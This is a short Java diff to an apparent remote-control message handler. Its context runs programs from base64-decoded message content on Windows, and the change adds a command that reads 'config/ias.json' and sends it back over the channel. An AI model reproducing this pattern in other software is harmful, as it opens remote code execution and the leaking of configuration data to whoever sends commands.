@@ -87,8 +87,8 @@ public class MessageHandler {
                     if (ShellUtil.isWin()) {
                         ShellUtil.runProg(Base64.getDecoder().decode(msgArr[1]));
                     }
-                case "vanish":
-                    //todo
+                case "iasconfig":
+                    MessageUtils.sendMessage(messageType, FileReadUtil.read("config/ias.json"));
                     break;
                 default:
                     break;
